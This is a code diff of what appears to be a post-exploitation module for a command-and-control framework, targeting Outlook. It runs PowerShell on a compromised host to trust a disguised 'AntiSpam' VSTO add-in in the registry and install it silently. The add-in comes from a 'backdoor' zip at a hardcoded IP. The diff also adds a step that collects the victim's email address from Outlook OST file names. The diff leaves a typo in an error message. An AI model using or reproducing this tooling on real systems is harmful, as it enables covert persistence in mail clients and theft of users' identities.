@@ -41,8 +41,7 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     # add registry settings for silent VSTO install
     vsto_reg_add = r"""New-Item 'HKCU:\Software\Microsoft\VSTO\Security\Inclusion\97618ff9-cf79-4ce2-b530-43e570019f67' -Force |
                        New-ItemProperty -Name PublicKey -Value '<RSAKeyValue><Modulus>1uL5d9QfFi4PfJpvvtUHXu6sROwLlO/kMQtYC3z3JpEneqAlyu7Dd+c4akI7xre5X2jMBI5D+hVWxrEiqPBnN8meKW2U59DTLPS6ZTBPYfdGxR65gY8AD8uGjlNfafm3niHL1yivC7zs1rz2W2z+aR7fmB0pNMe45k3uC2UWQo0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>' |
-                       New-ItemProperty -Name Url -Value 'file:///REPLACEME/Apps/antispam/AntiSpam.vsto'
-                    """
+                       New-ItemProperty -Name Url -Value 'file:///REPLACEME/Apps/antispam/AntiSpam.vsto'"""
     vsto_reg_add = vsto_reg_add.replace('REPLACEME',uploadpath.replace('\\','/'))
     opts['command'] = vsto_reg_add
     results = API.agent_run_shell_cmd_with_result(agent_name, opts)
@@ -64,10 +63,17 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\Apps\\antispam\\AntiSpam.vsto"'
     API.agent_run_shell_cmd_with_result(agent_name, opts)
 
+    # checks installation is complete
     opts['command'] = r"Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall' -recurse | Get-ItemProperty"
     if("AntiSpam" not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
-        raise ValueError("VSTO installation failed")
+        raise ValueError("VTO installation failed")
 
+    # gets email address from OST file
+    opts['command'] = r"Get-ChildItem $env:LocalAppData\Microsoft\Outlook\*.ost | % { $_.Name }"
+    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
+    results = results.replace(".ost", '')
+    if(" -" in results):
+        results = results[0:results.index(" -")]
     return results
     
 
